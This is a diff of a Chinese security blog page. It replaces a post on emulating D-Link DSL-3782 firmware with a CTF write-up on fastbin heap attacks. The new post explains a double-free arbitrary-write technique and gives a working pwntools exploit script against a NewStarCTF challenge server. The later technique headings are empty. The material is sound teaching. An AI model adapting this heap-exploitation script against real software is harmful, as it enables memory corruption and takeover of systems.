@@ -16,24 +16,25 @@
   <meta name="author" content="Isolator">
   <meta name="keywords" content="">
   
-    <meta name="description" content="CVE-2023-27216">
+    <meta name="description" content="fastbin的几种攻击方法">
 <meta property="og:type" content="article">
-<meta property="og:title" content="firmae安装及D-Link DSL-3782仿真">
-<meta property="og:url" content="https://isolator-1.github.io/2023/09/14/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/firmae%E5%AE%89%E8%A3%85%E5%8F%8AD-Link%20DSL-3782%E4%BB%BF%E7%9C%9F/index.html">
+<meta property="og:title" content="Fastbin Attack">
+<meta property="og:url" content="https://isolator-1.github.io/2023/10/24/ctf-pwn/Fastbin%20Attack/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
-<meta property="og:description" content="CVE-2023-27216">
+<meta property="og:description" content="fastbin的几种攻击方法">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://isolator-1.github.io/img/CVE-2023-27216/1.jpg">
-<meta property="article:published_time" content="2023-09-14T02:00:00.000Z">
-<meta property="article:modified_time" content="2023-09-14T02:52:41.962Z">
+<meta property="og:image" content="https://isolator-1.github.io/img/Fastbin/1.jpg">
+<meta property="article:published_time" content="2023-10-24T02:58:00.000Z">
+<meta property="article:modified_time" content="2023-10-24T03:21:30.323Z">
 <meta property="article:author" content="Isolator">
-<meta property="article:tag" content="firmware analysis">
+<meta property="article:tag" content="ctf-pwn">
+<meta property="article:tag" content="exp">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://isolator-1.github.io/img/CVE-2023-27216/1.jpg">
+<meta name="twitter:image" content="https://isolator-1.github.io/img/Fastbin/1.jpg">
   
   
   
-  <title>firmae安装及D-Link DSL-3782仿真 - Isolator&#39;s Blog</title>
+  <title>Fastbin Attack - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -198,7 +199,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="firmae安装及D-Link DSL-3782仿真"></span>
+            <span id="subtitle" data-typed-text="Fastbin Attack"></span>
           
         </div>
 
@@ -209,8 +210,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-09-14 10:00" pubdate>
-          September 14, 2023 am
+        <time datetime="2023-10-24 10:58" pubdate>
+          October 24, 2023 am
         </time>
       </span>
     
@@ -221,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          389 words
+          1.1k words
         
       </span>
     
@@ -232,7 +233,7 @@
         
         
         
-          4 mins
+          10 mins
         
       </span>
     
@@ -270,23 +271,21 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">firmae安装及D-Link DSL-3782仿真</h1>
+            <h1 style="display: none">Fastbin Attack</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="FirmAE安装"><a href="#FirmAE安装" class="headerlink" title="FirmAE安装"></a>FirmAE安装</h3><p><code>https://github.com/pr0v3rbs/FirmAExu</code></p>
-<p>需要注意的点：</p>
-<ol>
-<li>git clone时记得recursive，不能git clone就把 routersploit这个库复制到<code>./analysis</code>里</li>
-<li><code>download.sh</code>里的下载最好自己下来复制到<code>./binaries</code>里</li>
-<li><code>install.sh</code>中 open-jdk-8和fusecram没法直接从apt安装（暂时当它不存在）</li>
-</ol>
-<h3 id="DLink-DSL-3782漏洞复现"><a href="#DLink-DSL-3782漏洞复现" class="headerlink" title="DLink DSL-3782漏洞复现"></a>DLink DSL-3782漏洞复现</h3><p>固件地址：<a target="_blank" rel="noopener" href="https://media.dlink.eu/support/products/dsl/dsl-3782/driver_software/dsl-3782_a1_eu_1.01_07282016.zip">https://media.dlink.eu/support/products/dsl/dsl-3782/driver_software/dsl-3782_a1_eu_1.01_07282016.zip</a></p>
-<p>参考方法：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-278413.htm">https://bbs.kanxue.com/thread-278413.htm</a></p>
-<p>先直接把固件跑起来，抄一下exp试一试：</p>
-<p><img src="/img/CVE-2023-27216/1.jpg" srcset="/img/loading.gif" lazyload></p>
-<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h4>
+                <h4 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h4><h5 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h5><p>以buuoj NewStarCTF 2023 week 4 Double为例</p>
+<p>目的是向任意地址写入值</p>
+<p>经典的网图</p>
+<p><img src="/img/Fastbin/1.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>原理在于，三次free之后，第一次把chunk1 malloc出来之后，可以对content部分进行编辑，而content对于第三次malloc出来的chunk1是fd，这个fd在第四次malloc时，会从自己写的地址进行malloc，然后这个malloc出来的块的content又是可编辑的。这样就实现了任意地址写。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./Double&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">25942</span>)<br><br><span class="hljs-comment">#gdb.attach(p, &quot;b *0x080486B5&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, content</span>):<br>  p.recvuntil(<span class="hljs-string">b&quot;&gt;\n&quot;</span>)<br>  p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>  p.recvuntil(<span class="hljs-string">b&quot;Input idx\n&quot;</span>)<br>  p.sendline(idx)<br>  p.recvuntil(<span class="hljs-string">b&quot;Input content\n&quot;</span>)<br>  p.sendline(content)<br>  <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>  p.recvuntil(<span class="hljs-string">b&quot;&gt;\n&quot;</span>)<br>  p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>  p.recvuntil(<span class="hljs-string">b&quot;Input idx\n&quot;</span>)<br>  p.sendline(idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():  <br>  p.recvuntil(<span class="hljs-string">b&quot;&gt;\n&quot;</span>)<br>  p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>  <br>  <br>add(<span class="hljs-string">b&#x27;1&#x27;</span>, <span class="hljs-string">b&quot;aaaa&quot;</span>)<br>add(<span class="hljs-string">b&#x27;2&#x27;</span>, <span class="hljs-string">b&quot;bbbb&quot;</span>)<br>free(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>free(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>free(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;1&#x27;</span>, p64(<span class="hljs-number">0x602070</span> - <span class="hljs-number">16</span>))<br><br>add(<span class="hljs-string">b&#x27;2&#x27;</span>, <span class="hljs-string">b&#x27;dddd&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;3&#x27;</span>, <span class="hljs-string">b&#x27;eeee&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;4&#x27;</span>, p64(<span class="hljs-number">1638</span>))<br><br>check()<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h5><h5 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h5><h5 id="Arbitary-Alloc"><a href="#Arbitary-Alloc" class="headerlink" title="Arbitary Alloc"></a>Arbitary Alloc</h5>
                 
               </div>
             
@@ -304,7 +303,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/" class="category-chain-item">固件仿真</a>
+  <a href="/categories/ctf-pwn/" class="category-chain-item">ctf-pwn</a>
   
   
 
@@ -319,7 +318,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/firmware-analysis/">#firmware analysis</a>
+        <a href="/tags/ctf-pwn/">#ctf-pwn</a>
+      
+        <a href="/tags/exp/">#exp</a>
       
     </div>
   
@@ -331,8 +332,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>firmae安装及D-Link DSL-3782仿真</div>
-      <div>https://isolator-1.github.io/2023/09/14/固件仿真/firmae安装及D-Link DSL-3782仿真/</div>
+      <div>Fastbin Attack</div>
+      <div>https://isolator-1.github.io/2023/10/24/ctf-pwn/Fastbin Attack/</div>
     </div>
     <div class="license-meta">
       
@@ -344,7 +345,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>September 14, 2023</div>
+          <div>October 24, 2023</div>
         </div>
       
       
@@ -376,18 +377,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/09/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Eng/" title="英语课笔记">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">英语课笔记</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/05/12/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/Vxworks/" title="VxWorks固件函数符号恢复、固件加载地址识别">
-                        <span class="hidden-mobile">VxWorks固件函数符号恢复、固件加载地址识别</span>
+                      <a href="/2023/10/23/ctf-pwn/FormatString/" title="FormatString">
+                        <span class="hidden-mobile">FormatString</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
